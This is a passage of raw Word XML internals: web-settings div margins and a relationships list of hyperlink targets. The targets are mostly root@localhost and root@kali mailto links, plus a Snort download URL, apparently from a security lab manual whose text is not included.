        <w:div w:id="1302999785">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1555046102">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="12655397">
          <w:marLeft w:val="840"/>
          <w:marRight w:val="1450"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="32582821">
          <w:marLeft w:val="840"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="37750134">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="104348137">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="601"/>
          <w:marTop w:val="60"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="112331266">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="114445213">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="307394572">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="326445275">
          <w:marLeft w:val="840"/>
          <w:marRight w:val="1353"/>
          <w:marTop w:val="7"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="559940965">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="599"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="623391096">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="828061931">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="596"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="956836360">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="12"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1466925015">
          <w:marLeft w:val="840"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1468860157">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1470316998">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1682047246">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1771900045">
          <w:marLeft w:val="120"/>
          <w:marRight w:val="-20"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1861966173">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="1"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1575779472">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1736539795">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="18244255">
          <w:marLeft w:val="1440"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="123427465">
          <w:marLeft w:val="1440"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1581524342">
          <w:marLeft w:val="1440"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1874927659">
          <w:marLeft w:val="360"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1946381692">
          <w:marLeft w:val="1440"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1742100678">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1813401063">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1865052319">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="41099619">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="374"/>
          <w:marBottom w:val="468"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="104471394">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="822624187">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="16695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3711">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2033189116">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="452408436">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1544516542">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="2115175535">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="949321310">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="374"/>
          <w:marBottom w:val="468"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="2130933333">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="980697800">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="4372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mailto:root@localhost" TargetMode="External" /><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer3.xml" /><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:jn@rajalakshmi.edu.in" TargetMode="External" /><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.snort.org/downloads/snort/snort-2.9.8.3.tar.gz" TargetMode="External" /><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml" /><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.snort.org/contact" TargetMode="External" /><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml" /><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:heinrichh@duesseldorf.de" TargetMode="External" /><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.yahoo.com" TargetMode="External" /><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml" /><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml" /><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer2.xml" /><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer4.xml" /><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml" /><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:jn@rajalakshmi.edu.in" TargetMode="External" /><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@kali:~" TargetMode="External" /><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:root@localhost" TargetMode="External" /><Relationship Id="rId41" 